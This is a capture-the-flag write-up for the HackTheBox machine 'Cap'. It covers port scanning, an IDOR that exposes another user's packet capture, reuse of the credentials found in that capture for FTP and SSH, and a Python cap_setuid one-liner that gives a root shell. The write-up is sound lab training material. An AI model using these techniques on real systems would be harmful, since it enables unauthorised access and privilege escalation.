# Cap - HackTheBox | Detailed Writeup

Hi guys thanks for reading, if you find this writeup helpful, please consider giving a ⭐ to my repo

# Info about the Box
**Name**: Cap  
**Difficulty**: Easy  
**OS**: Linux  
**Creator**: [InfoSecJack](https://app.hackthebox.com/users/52045)  
**Writeup author**: [zedd9001](https://app.hackthebox.com/users/2732230)

# Intro

Cap is an easy rated straight forward HackTheBox machine which starts off with an IDOR which allows us to analyze other users `.pcap` files, changing the value which is vulnerable to IDOR to `0` and then analyzing the file we find credentials and then log into SSH, there we find that an exploitable capability is there and is in GTFOBins and then we root the box

# NMAP 
```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack Gunicorn
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Seems like a normal box

# FTP Enumeration
Anonymous login is disabled :(
```
root@zack:~/ctfs/htb/cap$ ftp anonymous@cap
Connected to cap.htb.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed.
ftp> bye
221 Goodbye.
root@zack:~/ctfs/htb/cap$ ftp anonymous@cap
Connected to cap.htb.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
530 Login incorrect.
```

# SSH Enumeration
Password based authentication is enabled which is bad practice because it typically allows brute forcing
```
root@zack:~/ctfs/htb/cap$ ssh root@cap
The authenticity of host 'cap (10.10.10.245)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cap' (ED25519) to the list of known hosts.
root@cap's password: 
```
 
# HTTP
Immediately finding a user, `Nathan` also we are logged in as him which is interesting
  
![Security dashboard screenshot](/assets/img/htb/cap/dashboard.png)
## Possible IDOR
![IDOR](/assets/img/htb/cap/idor.png)
## IDOR Confirmed
Resources to learn more about `IDOR`: 
[Portswigger Academy](https://portswigger.net/web-security/access-control/idor)
  
Changed the data value to 1
```
http://cap.htb/data/1
```
 
![Confirmed IDOR](/assets/img/htb/cap/idor-confirmed.png)


## Analysis of the `.pcap` file
I wasn't getting any juicy information, then I realized that 0 could also be a possible value and changed it to that and DAMN was that file juicy when I looked at it in `Wireshark`!! 

## Credentials
 
![Wireshark](/assets/img/htb/cap/wireshark.png)
```
nathan:Buck3tH4TF0RM3!
```
Checking if the credentials are still valid or not:
## FTP
```
root@zack:~/ctfs/htb/cap$ nxc ftp cap -u 'nathan' -p 'Buck3tH4TF0RM3!'
FTP         10.10.10.245    21     cap              [+] nathan:Buck3tH4TF0RM3!
```

## SSH
```
root@zack:~/ctfs/htb/cap$ nxc ssh cap -u 'nathan' -p 'Buck3tH4TF0RM3!'
SSH         10.10.10.245    22     cap              [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
SSH         10.10.10.245    22     cap              [+] nathan:Buck3tH4TF0RM3!  Linux - Shell access!
```
Great!!! we have FTP and SSH access!! 

I went into FTP but didn't find anything interesting over there, so I logged into SSH
# Privilege Escalation
I did a little bit of enumeration and found out that we have an interesting capability: 
```
nathan@cap:~$ getcap -r / 2>/dev/null 
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
``` 

[Learn more about linux capabilities](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html)

---
![GTFOBins ](/assets/img/htb/cap/gtfobins.png)

This /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip should stand out to you because it is not a normal capability, after a few google searches I found out that this was in GTFOBins 
I tweaked the payload a bit so that it works like how I want it, the finished result is:
```
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# 
```
 
# Thoughts
This was a nice easy box, great for beginners. I really liked the IDOR part because it taught me `0` can also be a possibility
